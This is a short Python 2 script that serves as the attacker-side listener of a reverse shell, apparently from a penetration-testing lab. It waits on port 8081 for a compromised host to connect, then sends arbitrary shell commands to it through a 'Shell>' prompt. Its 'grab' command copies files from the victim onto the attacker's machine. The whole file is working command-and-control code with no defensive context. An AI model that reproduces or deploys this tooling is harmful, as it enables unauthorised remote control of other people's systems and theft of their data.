#!/bin/env python

import socket
import os

def transfer(conn,command):
	conn.send(command)
	f = open('/root/Desktop/test.py','wb')
	while True:
		bits = conn.recv(1024)
		if 'Unable to find out the file' in bits:
			print '[-] Unable to find out the file'
			break
		if bits.endswith('DONE'):
			print '[+] Transfer completed '
			f.close()
			break
		f.write(bits)
	f.close()



def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("10.11.0.202", 8081))
	s.listen(1)
	print '[+] listening for incoming TCP connection on port 8081'
	conn, addr = s.accept()
	print '[+] We got a connection from: ',addr
	
	
	
	while True:
		command = raw_input("Shell> ")
		
		if 'terminate' in command:
			conn.send('terminate')
			conn.close() #close the connection with host
			break
		elif 'grab' in command:
			#usage shell > grab*file
			transfer(conn,command)
		else:
			conn.send(command) #send command
			print conn.recv(1024)
			
			
			
def main ():
	connect()
main()
